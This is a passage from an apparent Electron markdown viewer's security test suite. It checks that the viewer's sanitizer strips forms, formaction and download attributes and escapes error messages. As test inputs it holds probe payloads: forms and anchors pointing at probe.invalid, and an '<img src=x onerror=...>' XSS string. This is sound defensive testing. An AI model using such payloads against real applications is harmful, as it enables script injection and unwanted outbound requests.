      '<form action="https://probe.invalid/pwn" method="get">' +
      "<button>SubmitProbe</button></form>\n\n" +
      '<button formaction="https://probe.invalid/fa">FormActionProbe</button>\n',
    "full",
    1200,
  );
  const formState = await exec(`
    (() => {
      const v = document.getElementById('viewer');
      const btns = Array.from(v.querySelectorAll('button'));
      return {
        forms: v.querySelectorAll('form').length,
        actionAttrs: v.querySelectorAll('[action]').length,
        // Note: DOMPurify strips formaction unaided, so this clause locks in
        // current sanitizer behaviour rather than testing FORBID_ATTR. The
        // load-bearing clause is the form count; that one fails without
        // FORBID_TAGS (measured).
        formActionAttrs: v.querySelectorAll('[formaction]').length,
        // Control: DOMPurify unwraps a forbidden tag and keeps its children, so
        // the button surviving proves the payload reached the sanitizer and was
        // specifically stripped - not that the whole render silently failed.
        submitBtn: btns.some(b => b.textContent === 'SubmitProbe'),
        faBtn: btns.some(b => b.textContent === 'FormActionProbe')
      };
    })()
  `);
  check(
    "SEC-11 <form action> and formaction are stripped, their content is not",
    formState.forms === 0 &&
      formState.actionAttrs === 0 &&
      formState.formActionAttrs === 0 &&
      formState.submitBtn === true &&
      formState.faBtn === true,
    JSON.stringify(formState),
  );

  // ==========================================================================
  // SEC-29 - the table paths sanitized with a BARE DOMPurify.sanitize()
  //
  // Five call sites parsed markdown and sanitized it without SANITIZE_CONFIG,
  // silently opting out of the SEC-11 <form> control above. The comment on
  // SANITIZE_CONFIG called itself the "single source of truth for what the
  // sanitizer permits" - it was not.
  //
  // Reachability is the point: renderTableInDOM extracts only the <table>
  // element from its scratch div, so a <form> as a SIBLING of the table would
  // be dropped by the extraction. Nested inside a CELL it travels with the
  // table and is appended straight into the Node-privileged viewer.
  // ==========================================================================
  await render("# TableClean\n\nreset\n", "full", 600);
  const tableFormMd =
    "| A | B |\n" +
    "|---|---|\n" +
    '| <form action="https://probe.invalid/tbl"><button>TableFormProbe</button></form> | y |\n';
  const tableFormState = await exec(`
    (() => {
      window.renderTableInDOM(${JSON.stringify(tableFormMd)}, 'insert');
      const v = document.getElementById('viewer');
      const btns = Array.from(v.querySelectorAll('button'));
      return {
        tables: v.querySelectorAll('table').length,
        forms: v.querySelectorAll('form').length,
        actionAttrs: v.querySelectorAll('[action]').length,
        // Same control as SEC-11: DOMPurify unwraps a forbidden tag and keeps
        // its children, so the button surviving proves the payload reached the
        // sanitizer and was specifically stripped - not that the table failed
        // to render, or that renderTableInDOM bailed at its querySelector.
        probeBtn: btns.some(b => b.textContent === 'TableFormProbe'),
      };
    })()
  `);
  check(
    "SEC-29 a <form> nested in a table cell is stripped on the context-menu table path",
    tableFormState.tables === 1 &&
      tableFormState.forms === 0 &&
      tableFormState.actionAttrs === 0 &&
      tableFormState.probeBtn === true,
    JSON.stringify(tableFormState),
  );

  // The other reachable half: the table dialog's live preview element. This is
  // fed from the open DOCUMENT on the 'edit' path, so its input is
  // attacker-controlled too, and it is a live node in the privileged window
  // rather than a detached scratch div.
  const tablePreviewState = await exec(`
    (() => {
      window.openTableInsertDialog(${JSON.stringify(tableFormMd)}, 'edit');
      const p = document.getElementById('tableInsertPreview');
      const out = {
        found: !!p,
        // Symmetric with the check above: without this, a marked change that
        // stopped emitting a <table> would put the <form> in a <p>, strip it
        // identically, and let probeBtn pass green while measuring a shape the
        // assertion's own name does not describe.
        tables: p ? p.querySelectorAll('table').length : -1,
        cellBtns: p ? p.querySelectorAll('td button').length : -1,
        forms: p ? p.querySelectorAll('form').length : -1,
        actionAttrs: p ? p.querySelectorAll('[action]').length : -1,
        probeBtn: p
          ? Array.from(p.querySelectorAll('button')).some(
              b => b.textContent === 'TableFormProbe',
            )
          : false,
      };
      // closeTableInsertDialog() only removes the 'visible' class, so on its
      // own it would leave tableDialogMode==='edit', the attack markdown in the
      // textarea and its render in the live preview - a trap for whatever test
      // is appended here next. Clear the source first, then reopen in 'insert'
      // (which resets the mode, the button label and, via updateTablePreview(),
      // the preview itself) before closing for real.
      const ta = document.getElementById('tableInsertMarkdown');
      if (ta) ta.value = '';
      window.openTableInsertDialog(null, 'insert');
      window.closeTableInsertDialog();
      out.residualForms = p ? p.querySelectorAll('form').length : -1;
      out.residualBtn = p
        ? Array.from(p.querySelectorAll('button')).some(
            b => b.textContent === 'TableFormProbe',
          )
        : true;
      return out;
    })()
  `);
  check(
    "SEC-29 a <form> nested in a table cell is stripped in the table dialog preview",
    tablePreviewState.found === true &&
      tablePreviewState.tables === 1 &&
      tablePreviewState.cellBtns === 1 &&
      tablePreviewState.forms === 0 &&
      tablePreviewState.actionAttrs === 0 &&
      tablePreviewState.probeBtn === true,
    JSON.stringify(tablePreviewState),
  );
  check(
    "SEC-29 the table dialog is left reset, not holding the attack markdown",
    tablePreviewState.residualForms === 0 &&
      tablePreviewState.residualBtn === false,
    JSON.stringify(tablePreviewState),
  );

  // The comment on TABLE_SANITIZE_CONFIG makes a load-bearing promise: the two
  // deny-lists are shared BY REFERENCE, so a tag added to SANITIZE_CONFIG can
  // never leave the table path behind again. Nothing measured that. Rewriting
  // the config to literal copies (['form'] / ['action','formaction']) leaves
  // both SEC-29 checks green and R449 still failing exactly as designed, while
  // fully re-arming the drift the comment declares impossible.
  //
  // Object identity is the right oracle: a copy, a spread, or a literal all
  // fail it, and it is the property the comment actually claims. SANITIZE_CONFIG
  // is a top-level `const` in a classic script, so it is not on `window` but IS
  // a global lexical binding - hence the reachability control, without which a
  // renaming refactor would make this pass by throwing into the catch.
  const aliasState = await exec(`
    (() => {
      try {
        return {
          reach: true,
          tagsAliased:
            SANITIZE_CONFIG.FORBID_TAGS === TABLE_SANITIZE_CONFIG.FORBID_TAGS,
          attrsAliased:
            SANITIZE_CONFIG.FORBID_ATTR === TABLE_SANITIZE_CONFIG.FORBID_ATTR,
          tagsFrozen: Object.isFrozen(SANITIZE_CONFIG.FORBID_TAGS),
          attrsFrozen: Object.isFrozen(SANITIZE_CONFIG.FORBID_ATTR),
          tags: SANITIZE_CONFIG.FORBID_TAGS.slice(),
          attrs: SANITIZE_CONFIG.FORBID_ATTR.slice(),
        };
      } catch (e) {
        return { reach: false, err: String(e && e.message) };
      }
    })()
  `);
  check(
    "SEC-29 the table config shares SANITIZE_CONFIG's deny-lists by reference, frozen",
    aliasState.reach === true &&
      aliasState.tagsAliased === true &&
      aliasState.attrsAliased === true &&
      aliasState.tagsFrozen === true &&
      aliasState.attrsFrozen === true &&
      aliasState.tags.join() === "form" &&
      aliasState.attrs.join() === "action,formaction,download",
    JSON.stringify(aliasState),
  );

  // ==========================================================================
  // SEC-30 - <a download> as an outbound-request primitive
  //
  // `download` is in DOMPurify 3.4.12's default ALLOWED_ATTR (measured: 118
  // entries; `download` and `href` in, `target` and `ping` out). A download is
  // NOT a navigation, so main.js's will-navigate / will-redirect /
  // will-frame-navigate / setWindowOpenHandler denies never see it, and CSP has
  // no directive that governs one. Inside #viewer the attribute was already
  // inert - every branch of the click delegation calls preventDefault() and
  // routes the link to shell.openExternal - but #tableInsertPreview sits
  // OUTSIDE #viewer and had no delegation. Measured before the fix: a download
  // anchor rendered there issued a live outbound HTTP request from the
  // Node-privileged renderer to a loopback beacon, while a plain anchor in the
  // same click batch was blocked by will-navigate.
  // ==========================================================================
  const dlProbeMd =
    "| A | B |\n" +
    "|---|---|\n" +
    '| <a download="pwned.txt" href="https://probe.invalid/dl">DownloadProbe</a> | y |\n';

  await render(dlProbeMd, "full", 600);
  const dlViewerState = await exec(`
    (() => {
      const v = document.getElementById('viewer');
      const a = Array.from(v.querySelectorAll('a')).find(
        x => x.textContent === 'DownloadProbe',
      );
      return {
        // Positive control: the anchor itself must survive, with its href. A
        // marked or DOMPurify change that stopped emitting the <a> at all would
        // otherwise report zero download attributes and read green while
        // measuring nothing.
        anchor: !!a,
        href: a ? a.getAttribute('href') : null,
        downloadAttrs: v.querySelectorAll('[download]').length,
        tables: v.querySelectorAll('table').length,
        renderError: window.__lastRenderError,
      };
    })()
  `);
  check(
    "SEC-30 the download attribute is stripped from document content in the viewer",
    dlViewerState.anchor === true &&
      dlViewerState.href === "https://probe.invalid/dl" &&
      dlViewerState.downloadAttrs === 0 &&
      dlViewerState.tables === 1 &&
      dlViewerState.renderError === null,
    JSON.stringify(dlViewerState),
  );

  // The reachable half: the dialog preview, whose 'edit' input is the open
  // document. Covered by the same strip only because TABLE_SANITIZE_CONFIG
  // aliases FORBID_ATTR by reference - the property the check above pins.
  const dlPreviewState = await exec(`
    (() => {
      window.openTableInsertDialog(${JSON.stringify(dlProbeMd)}, 'edit');
      const p = document.getElementById('tableInsertPreview');
      const a = p
        ? Array.from(p.querySelectorAll('a')).find(
            x => x.textContent === 'DownloadProbe',
          )
        : null;
      const out = {
        found: !!p,
        anchor: !!a,
        href: a ? a.getAttribute('href') : null,
        downloadAttrs: p ? p.querySelectorAll('[download]').length : -1,
        tables: p ? p.querySelectorAll('table').length : -1,
      };
      // Inertness of the preview surface itself, independent of the attribute
      // strip. A bubble-phase listener observes the SAME event the capture
      // guard has already defaultPrevented. clickSeen is the control: it
      // proves the click really was dispatched to the anchor, so
      // clickPrevented cannot pass by the click silently not happening.
      let seen = false;
      let prevented = null;
      const spy = (e) => { seen = true; prevented = e.defaultPrevented; };
      if (p) p.addEventListener('click', spy);
      if (a) a.click();
      if (p) p.removeEventListener('click', spy);
      out.clickSeen = seen;
      out.clickPrevented = prevented;
      // Same reset as the SEC-29 block above: closeTableInsertDialog() only
      // drops the 'visible' class, so without this the attack markdown stays in
      // the textarea and its render stays in the live preview, trapping
      // whatever test is appended here next.
      const ta = document.getElementById('tableInsertMarkdown');
      if (ta) ta.value = '';
      window.openTableInsertDialog(null, 'insert');
      window.closeTableInsertDialog();
      out.residualDownloadAttrs = p ? p.querySelectorAll('[download]').length : -1;
      return out;
    })()
  `);
  check(
    "SEC-30 the download attribute is stripped in the table dialog preview",
    dlPreviewState.found === true &&
      dlPreviewState.anchor === true &&
      dlPreviewState.href === "https://probe.invalid/dl" &&
      dlPreviewState.downloadAttrs === 0 &&
      dlPreviewState.tables === 1 &&
      dlPreviewState.residualDownloadAttrs === 0,
    JSON.stringify(dlPreviewState),
  );
  check(
    "SEC-30 clicks in the table dialog preview are inert",
    dlPreviewState.clickSeen === true && dlPreviewState.clickPrevented === true,
    JSON.stringify(dlPreviewState),
  );

  // ==========================================================================
  // N10 - the table dialog's validation error
  //
  // Three defects in one line. It was the last Turkish string in the product
  // (the Turkish and Ukrainian locales, and the switcher between them, were
  // removed earlier; this one survived because it never went through i18n(),
  // so the locale sweep could not see it). It was assigned with innerHTML,
  // into the very preview box SEC-30 had just hardened. And it hardcoded
  // background:#ffe6e6, a light pink that is unreadable on the three dark
  // themes, while every theme already defines --danger-fg/--danger-glow-rgb.
  // ==========================================================================
  const n10State = await exec(`
    (() => {
      const ta = document.getElementById('tableInsertMarkdown');
      const p = document.getElementById('tableInsertPreview');
      const btn = document.getElementById('tableInsertBtn');
      const overlay = document.getElementById('tableInsertOverlay');
      window.openTableInsertDialog(null, 'insert');
      if (ta) ta.value = 'not a table, just prose';
      // Driven through the real button, not the function, so the check also
      // covers the listener being connected.
      if (btn) btn.click();

      const err = p ? p.querySelector('.table-insert-error') : null;
      const out = {
        found: !!p,
        clicked: !!btn,
        err: !!err,
        // The dialog must STAY OPEN on invalid input. If validation stopped
        // rejecting, insertTableFromDialog() would fall through, close the
        // dialog and insert nothing - a silent failure this pins.
        stillOpen: overlay ? overlay.classList.contains('visible') : null,
        text: err ? err.textContent : null,
        role: err ? err.getAttribute('role') : null,
        // Shape and ordering: the error is the ONLY thing in the box and it is
        // first. Deliberately NOT claimed as proof of node construction - an
        // innerHTML assignment with no surrounding whitespace produces exactly
        // one child node too, and would satisfy every conjunct here. That
        // property is unobservable from the DOM and is pinned statically in
        // test:packaging instead. What this does catch is a whitespace-padded
        // assignment, or an append that leaves the previous render in place.
        previewNodes: p ? p.childNodes.length : -1,
        previewFirstIsErr: p ? p.firstChild === err : null,
        errChildren: err ? err.children.length : -1,
        inlineStyle: err ? err.getAttribute('style') : 'NO-ELEMENT',
        // Full Turkish-specific set, upper and lower: the earlier version
        // omitted c-cedilla, o- and u-umlaut and so could not have seen a
        // partial reintroduction.
        turkish: err
          ? /[\\u011E\\u011F\\u0130\\u0131\\u015E\\u015F\\u00C7\\u00E7\\u00D6\\u00F6\\u00DC\\u00FC]/.test(
              err.textContent,
            )
          : null,
        fromTable: err ? err.textContent === i18n('table.invalidFormat') : null,
      };

      // Theming. Read the resolved colours under two different themes: the
      // whole point of the change is that they track the theme rather than
      // being frozen at one hardcoded red.
      //
      // try/finally, not straight-line: if a read throws, data-theme would
      // otherwise be left on 'clarity' for every test appended after this one -
      // the one leak the "do not trap the next test" reset below does not
      // cover, because it only restores the dialog.
      const themeBefore = document.body.getAttribute('data-theme');
      const readColours = () => {
        if (!err || !p) return null;
        const cs = getComputedStyle(err);
        return {
          fg: cs.color,
          // Non-vacuity control. If --danger-fg were misspelt, the declaration
          // color: var(--typo) is invalid at computed-value time and the
          // element INHERITS instead - and inherited text colour also differs
          // between themes, so "fg differs across themes" alone would still
          // pass. Pinning err's colour as distinct from its parent's catches
          // that.
          inherited: getComputedStyle(p).color,
          // The ABSENCE of a fill is a deliberate, measured decision (see the
          // rule's comment in styles.css) and nothing else observes it.
          bg: cs.backgroundColor,
          // Width and style, not colour. border-top-COLOR is useless here: its
          // initial value is currentcolor, so if the border declaration were
          // misspelt or deleted outright it still reports the element's color,
          // which already differs between themes - the conjunct could only
          // fail when the colour check had already failed.
          //
          // Width is read as a NUMBER and only pinned non-zero. The string is
          // not "1px": getComputedStyle returns the used value, which Chromium
          // snaps to device pixels, and this window reports 0.8px. Deletion
          // still computes to 0 with style 'none', which is what this catches.
          borderW: parseFloat(cs.borderTopWidth),
          borderS: cs.borderTopStyle,
        };
      };
      try {
        document.body.setAttribute('data-theme', 'abyss');
        out.abyss = readColours();
        document.body.setAttribute('data-theme', 'clarity');
        out.clarity = readColours();
      } finally {
        if (themeBefore === null) {
          document.body.removeAttribute('data-theme');
        } else {
          document.body.setAttribute('data-theme', themeBefore);
        }
      }
      out.themeRestored = document.body.getAttribute('data-theme') === themeBefore;

      if (ta) ta.value = '';
      window.openTableInsertDialog(null, 'insert');
      window.closeTableInsertDialog();
      return out;
    })()
  `);
  check(
    "N10 the table validation error is an English text node, not Turkish markup",
    n10State.found === true &&
      n10State.clicked === true &&
      n10State.err === true &&
      n10State.stillOpen === true &&
      n10State.turkish === false &&
      // Both halves are required. i18n() returns the KEY when the key is
      // missing, so fromTable alone would still be true if the string were
      // deleted - both sides would collapse to 'table.invalidFormat'. The
      // literal pins the actual English text.
      n10State.fromTable === true &&
      n10State.text.includes("Invalid table format") &&
      // The glyph survives neither revert on its own, so nothing else pins it.
      n10State.text.startsWith("\u26A0") &&
      n10State.role === "alert" &&
      n10State.previewNodes === 1 &&
      n10State.previewFirstIsErr === true &&
      n10State.errChildren === 0 &&
      n10State.inlineStyle === null,
    JSON.stringify(n10State),
  );
  check(
    "N10 the validation error is themed, and tracks the active theme",
    n10State.abyss !== null &&
      n10State.clarity !== null &&
      // The colour it replaced, frozen at this value under every theme.
      n10State.abyss.fg !== "rgb(255, 0, 0)" &&
      n10State.clarity.fg !== "rgb(255, 0, 0)" &&
      // The token really resolved, rather than the declaration being dropped
      // and the element inheriting its parent's colour.
      n10State.abyss.fg !== n10State.abyss.inherited &&
      n10State.clarity.fg !== n10State.clarity.inherited &&
      // No tinted fill, under either theme. This is what makes R457's
      // background line load-bearing: without it, a regression that re-added a
      // fill while keeping the themed colour would pass every other conjunct.
      n10State.abyss.bg === "rgba(0, 0, 0, 0)" &&
      n10State.clarity.bg === "rgba(0, 0, 0, 0)" &&
      // The box outline survives at all - deletion is the realistic accident,
      // and it is invisible to a colour comparison.
      n10State.abyss.borderW > 0 &&
      n10State.abyss.borderS === "solid" &&
      n10State.abyss.fg !== n10State.clarity.fg &&
      n10State.themeRestored === true,
    JSON.stringify(n10State),
  );

  // ==========================================================================
  // N12 - the markdown render-failure banner
  //
  // The tail catch of renderMarkdownFull() assigned viewer.innerHTML from a
  // template literal interpolating ${error.message}, styled with a hardcoded
  // color:red. Strictly worse than the N10 line above: marked and DOMPurify
  // both quote document content back in their errors, so a document that
  // fails to render could put markup of its own choosing into a Node-
  // privileged renderer through the very handler written to report the
  // failure. Now built from nodes, with the message as a text node, and
  // themed through --danger-fg.
  //
  // The catch is not reachable from a document alone - every stage of the
  // pipeline that can fail on hostile input is already guarded - so the
  // failure has to be injected. That is a statement about the product, not a
  // weakness in the test: a probe that waited for the app to reach this sink
  // on its own would be permanently vacuous. Same reasoning as 13b2 in the
  // mermaid suite.
  // ==========================================================================

  // The deliberate failure logs console.error('Error rendering markdown:', e).
  // Muted narrowly, and the mute is asserted to have caught exactly that
  // below - a mute that suppresses nothing has quietly stopped describing the
  // test it was opened for.
  await sentinel.mute("N12 forces the render pipeline to throw on purpose");

  const n12Installed = await exec(`
    (() => {
      // renderer.js is a classic <script>, so its top-level function
      // declarations are properties of window and the pipeline's own call
      // site resolves through that global binding. Replacing it here really
      // does make renderMarkdownFull's internal call throw.
      //
      // applyRawHtmlDocuments() is the throw site because it is called inside
      // the try IMMEDIATELY AFTER patchViewerDOM(html) - so the viewer holds a
      // fully rendered document when the throw lands, and the banner
      // REPLACING that content is observable rather than merely appearing in
      // an empty pane.
      //
      // Deliberately not marked.parse: marked 18's esbuild UMD makes every
      // export a getter-only, non-configurable accessor, so assigning to it
      // fails SILENTLY under sloppy mode and the throw would never happen.
      window.__n12Saved = window.applyRawHtmlDocuments;
      // Carries markup on purpose. If the message were ever interpolated into
      // HTML again, these two elements would exist in the banner and the
      // onerror handler would set __pwned.
      window.__n12Msg = '<img src=x onerror="window.__pwned = 1"><b>bold</b>';
      window.applyRawHtmlDocuments = function () {
        throw new Error(window.__n12Msg);
      };
      return (
        typeof window.__n12Saved === 'function' &&
        window.applyRawHtmlDocuments !== window.__n12Saved
      );
    })()
  `);

  const n12Pwned = await render("# N12\n\nrender failure probe\n", "full", 700);

  const n12State = await exec(`
    (() => {
      const viewer = document.getElementById('viewer');
      const box = viewer.querySelector('.render-error');
      const strong = box ? box.querySelector('strong') : null;
      const overlay = document.getElementById('loadingScreen');
      const out = {
        box: !!box,
        // The banner REPLACED the rendered document rather than being
        // appended beside it, and it is the only thing left.
        viewerNodes: viewer.childNodes.length,
        viewerFirstIsBox: viewer.firstChild === box,
        role: box ? box.getAttribute('role') : null,
        label: strong ? strong.textContent : null,
        // Both halves are required. i18n() returns the KEY on a miss, so the
        // comparison alone would still hold if the string were deleted - both
        // sides would collapse to 'render.failed'. The literal pins the text.
        fromRender: strong
          ? strong.textContent === i18n('render.failed')
          : null,
        text: box ? box.textContent : null,
        // The message reaches the reader VERBATIM, markup and all, as text.
        // Escaping is proven by the two conjuncts below rather than by this
        // one: a correctly-escaped text node and an innerHTML assignment both
        // put these characters on screen, but only the second creates
        // elements out of them.
        hasMessage: box ? box.textContent.indexOf(window.__n12Msg) >= 0 : null,
        // Exactly <strong> and <br>. Anything the message spelled would show
        // up here as a third element.
        boxChildren: box ? box.children.length : -1,
        injected: box ? box.querySelectorAll('img, b, script').length : -1,
        inlineStyle: box ? box.getAttribute('style') : 'NO-ELEMENT',
        // The catch is the last thing to run on this path, so it owns the
        // full-screen click-blocking overlay. Leaving it up strands the whole
        // UI behind a permanent "Loading..." - the defect already recorded on
        // the superseded-render path.
        overlayActive: overlay ? overlay.classList.contains('active') : null,
      };

      // Theming, read under two schemes. try/finally rather than straight
      // line: a throw in a read would otherwise leave data-theme on 'clarity'
      // for every test appended after this one.
      const themeBefore = document.body.getAttribute('data-theme');
      const readColours = () => {
        if (!box) return null;
        const cs = getComputedStyle(box);
        return {
          fg: cs.color,
          // Non-vacuity control: a misspelt var() is invalid at
          // computed-value time and the element INHERITS, and the inherited
          // colour also differs between themes - so "fg differs across
          // themes" alone would still pass. #viewer is the parent, and it is
          // also the surface whose background this banner is measured
          // against.
          inherited: getComputedStyle(viewer).color,
          // No fill, deliberately and measurably (see the rule's comment in
          // styles.css). Nothing else observes the absence.
          bg: cs.backgroundColor,
          // Width and style, never border-top-COLOR: its initial value is
          // currentcolor, so a deleted border declaration still reports the
          // element's own colour and the conjunct could only fail once the
          // colour check already had. Width is a NUMBER and only pinned
          // non-zero - getComputedStyle returns the device-snapped used
          // value, 0.8px on this display.
          borderW: parseFloat(cs.borderTopWidth),
          borderS: cs.borderTopStyle,
        };
      };
      try {
        document.body.setAttribute('data-theme', 'abyss');
        out.abyss = readColours();
        document.body.setAttribute('data-theme', 'clarity');
        out.clarity = readColours();
      } finally {
        if (themeBefore === null) {
          document.body.removeAttribute('data-theme');
        } else {
          document.body.setAttribute('data-theme', themeBefore);
        }
      }
      out.themeRestored = document.body.getAttribute('data-theme') === themeBefore;
      return out;
    })()
  `);

  check(
    "N12 a render failure reports as an escaped text node, not interpolated markup",
    n12Installed === true &&
      // The message spells an onerror handler. If it were ever interpolated
      // into HTML the image would load, fail and run it.
      n12Pwned === null &&
      n12State.box === true &&
      n12State.viewerNodes === 1 &&
      n12State.viewerFirstIsBox === true &&
      n12State.role === "alert" &&
      n12State.fromRender === true &&
      n12State.label === "Error rendering markdown:" &&
      n12State.hasMessage === true &&
      n12State.boxChildren === 2 &&
      n12State.injected === 0 &&
      n12State.inlineStyle === null &&
      n12State.overlayActive === false,
    JSON.stringify(n12State) + " installed=" + n12Installed + " pwned=" + n12Pwned,
  );

  check(
    "N12 the render-failure banner is themed, and tracks the active theme",
    n12State.abyss !== null &&
      n12State.clarity !== null &&
      // The colour it replaced, frozen at this value under every theme.
      n12State.abyss.fg !== "rgb(255, 0, 0)" &&
      n12State.clarity.fg !== "rgb(255, 0, 0)" &&
      // The token really resolved, rather than the declaration being dropped
      // and the element inheriting #viewer's colour.
      n12State.abyss.fg !== n12State.abyss.inherited &&
      n12State.clarity.fg !== n12State.clarity.inherited &&
      n12State.abyss.bg === "rgba(0, 0, 0, 0)" &&
      n12State.clarity.bg === "rgba(0, 0, 0, 0)" &&
      n12State.abyss.borderW > 0 &&
      n12State.abyss.borderS === "solid" &&
      n12State.abyss.fg !== n12State.clarity.fg &&
      n12State.themeRestored === true,
    JSON.stringify(n12State),
  );

  // Uninstall, then prove it BEHAVIOURALLY by rendering again: a check that
  // the saved slot is gone would pass for a restore that put back the wrong
  // function. The banner disappearing is what says the pipeline is whole.
  await exec(`
    (() => {
      if (typeof window.__n12Saved === 'function') {
        window.applyRawHtmlDocuments = window.__n12Saved;
      }
      delete window.__n12Saved;
      return null;
    })()
  `);
  await render("# N12Restored\n\nthe pipeline is whole again\n", "full", 700);
  const n12After = await exec(`
    (() => {
      const viewer = document.getElementById('viewer');
      return {
        banner: !!viewer.querySelector('.render-error'),
        heading: !!viewer.querySelector('h1'),
      };
    })()
  `);
  check(
    "N12 the injected failure is removed and the pipeline renders normally again",
    n12After.banner === false && n12After.heading === true,
    JSON.stringify(n12After),
  );

  // The mute has to have caught the console.error it was opened for. Drained
  // first: console-message crosses an IPC boundary, so it does not arrive just
  // because the awaited executeJavaScript resolved.
  await sentinel.drain();
  const n12Mute = sentinel.currentMute();
  const n12Suppressed = (n12Mute && n12Mute.suppressed) || [];
  check(
    "N12 the deliberate render failure really reached the console (the mute is not vacuous)",
    n12Suppressed.some(
      (s) =>
        s.kind === "console-error" && /Error rendering markdown/.test(s.detail),
    ),
    JSON.stringify(n12Suppressed).slice(0, 400),
  );
  await sentinel.unmute();

  await render("# TableCleanup\n\nreset\n", "full", 600);

  // <map><area href> survives DOMPurify: an image map is a hyperlink that is
  // not an <a>. The renderer's click handler now matches it, so it obeys the
  // same external/local policy as every other link instead of falling through
  // to Chromium's default follow.
  const sec11AreaBody =
    '# Nav\n\n<img src="x.png" usemap="#m" alt="m">\n' +
      '<map name="m"><area shape="rect" coords="0,0,20,20" ' +
      'href="https://probe.invalid/area" alt="AreaProbe"></map>\n';
  const sec11AreaFile = path.join(dir, "sec11-image-map.md");
  const sec11Contents = win.webContents, sec11Frame = sec11Contents.mainFrame;
  const sec11PageUrl = sec11Contents.getURL();
  const sec11Shutdown = require("../src/main.js").__shutdown;
  const sec11Shell = require("electron").shell;
  const sec11Openers = { external: sec11Shell.openExternal, path: sec11Shell.openPath };
  const sec11Registration = {
    handler: securityGestureRegistration.handler, installed: securityGestureRegistration.installed,
  };
  const sec11Send = sec11Contents.send;
  const sec11Slots = {
    observer: Object.getOwnPropertyDescriptor(securityGestureRegistration, "observer"),
    send: Object.getOwnPropertyDescriptor(sec11Contents, "send"),
  };
  const sec11ReadFile = fs.readFileSync;
  const sec11RealPathHost = fs.realpathSync;
  const sec11Key = require("node:crypto").randomUUID();
  const sec11Entries = [], sec11Sends = [], sec11Navigation = [], sec11Faults = [], sec11Work = [];
  let sec11Phase = "admission";
  let sec11Owner = null, sec11Active = false, sec11Installed = false, sec11PageAttempted = false;
  let areaState, urlBeforeArea, urlAfterArea, externalUrl, sec11Failure = null;
  const sec11SamePage = () => win === observedMain && !win.isDestroyed() &&
    win.webContents === sec11Contents && !sec11Contents.isDestroyed() &&
    sec11Contents.mainFrame === sec11Frame && !sec11Frame.isDestroyed() &&
    sec11Contents.getURL() === sec11PageUrl && sec11Frame.url === sec11PageUrl;
  const sec11Observer = {
    enter(event, data) {
      const entry = {
        kind: data?.kind, href: data?.href, ref: data?.documentRef,
        owner: event.sender === sec11Contents && BrowserWindow.fromWebContents(event.sender) === win,
        frame: event.senderFrame === sec11Frame, settled: false,
      };
      sec11Entries.push(entry);
      if (!sec11Active || sec11Entries.length !== 1 || !entry.owner || !entry.frame ||
          entry.kind !== "link" || entry.href !== "https://probe.invalid/area" ||
          entry.ref !== sec11Owner?.descriptor.ref) sec11Faults.push("Unexpected actual Main area gesture");
      return entry;
    },
    finish(entry, result, error) {
      if (entry !== sec11Entries[0] || entry.settled) sec11Faults.push("Unexpected area settlement");
      entry.result = result; entry.error = error ? String(error.message || error) : null;
      entry.settled = true;
    },
  };
  const sec11ObservedSend = function(channel, value) {
    if (channel === "external-file-open-request" || channel === "show-error") {
      sec11Sends.push({ channel, value });
    }
    return sec11Send.apply(this, arguments);
  };
  const sec11OnNavigation = (details, url, _inPlace, mainFrame) => {
    const main = typeof details?.isMainFrame === "boolean" ? details.isMainFrame : mainFrame;
    if (main) sec11Navigation.push({ url: details?.url || url, sameDoc: details?.isSameDocument });
  };
  const sec11FsSlots = [
    [fs,"statSync","stat"], [fs,"existsSync","exists"],
    [fs,"readFileSync","read"], [sec11RealPathHost,"native","realpath"],
  ].map(([object,key,kind]) => {
    const original = object[key], slot = Object.getOwnPropertyDescriptor(object,key);
    if (typeof original !== "function" || !slot || !Object.hasOwn(slot,"value")) {
      throw new Error("SEC-11 image-map filesystem observation has no data owner: " + kind);
    }
    const installed = function(...args) {
      const file = String(args[0]);
      const forbidden = /^(\\\\|\/\/)|:\/\/|(?:probe|api\.example|svg|xlink)\.invalid/i.test(file);
      const record = sec11Active || forbidden ?
        {kind,file,phase:sec11Phase,forbidden,terminal:false} : null;
      if (record) sec11Work.push(record);
      try {
        if (forbidden) throw new Error("SEC-11 refuses recorded remote filesystem work");
        const result = original.apply(this,args);
        if (record) {
          if (kind === "stat") Object.assign(record,{regular:result.isFile(),directory:result.isDirectory()});
          else if (kind === "exists") record.exists = result;
          else if (kind === "realpath") record.resolved = result;
          else record.exactBody = typeof result === "string" ? result === sec11AreaBody :
            Buffer.isBuffer(result) && result.equals(Buffer.from(sec11AreaBody,"utf8"));
        }
        return result;
      } catch (error) {
        if (record) record.error = String(error.message || error);
        throw error;
      } finally { if (record) record.terminal = true; }
    };
    return {object,key,kind,original,slot,installed};
  });
  // The external route has no FS work; only closing its known fixture may read it.
  const sec11RetirementWork = record => record.phase === "retirement" &&
    record.terminal && !record.forbidden && !record.error &&
    [sec11AreaFile,sec11Owner.descriptor.readTarget].includes(record.file) &&
    (record.kind === "read" && record.exactBody === true ||
     record.kind === "exists" && record.exists === true ||
     record.kind === "stat" && record.regular === true && record.directory === false ||
     record.kind === "realpath" && record.resolved === sec11Owner.descriptor.readTarget);
  const sec11Authority = () => sec11SamePage() && securityDialogGuardsIntact() &&
    expectedSecurityQuestion === null && chooserAllowance === null &&
    securityGestureRegistration.count === 1 &&
    securityGestureRegistration.handler === sec11Registration.handler &&
    securityGestureRegistration.installed === sec11Registration.installed &&
    securityGestureRegistration.observer === (sec11Installed ? sec11Observer : null) &&
    sec11Contents.send === (sec11Installed ? sec11ObservedSend : sec11Send) &&
    Object.getOwnPropertyDescriptor(fs,"realpathSync")?.value === sec11RealPathHost &&
    sec11FsSlots.every(item => Object.getOwnPropertyDescriptor(item.object,item.key)?.value ===
      (sec11Installed ? item.installed : item.original)) &&
    sec11Shell.openExternal === sec11Openers.external && sec11Shell.openPath === sec11Openers.path;
  if (!sec11Authority() || typeof sec11Registration.handler !== "function" ||
      typeof sec11Registration.installed !== "function" ||
      Object.values(sec11Slots).some(slot => slot && !Object.hasOwn(slot, "value")) ||
      !await waitForExternalTrap(win)) {
    throw new Error("SEC-11 image-map requires current Main authority and the shared recording trap");
  }
  const sec11BeforeExternal = await visualUtils.readExternalOpens(win);
  const sec11BeforeShell = await visualUtils.readShellOpens(win);
  const sec11Read = async () => {
    if (!sec11Authority()) throw new Error("SEC-11 image-map lost its current Main authority");
    const before = sec11Shutdown.state();
    const generation = await exec("window.folia.getQuitApprovalGeneration()");
    const owner = await readSecurityImageOwner(sec11AreaFile);
    const page = await exec(`(() => {
      const p = window.__securityArea;
      if (!p || p.owner !== ${JSON.stringify(sec11Key)} || p.errors !== window.__e2eErrors ||
          p.tabs !== window.CustomTabs || p.folia !== window.folia ||
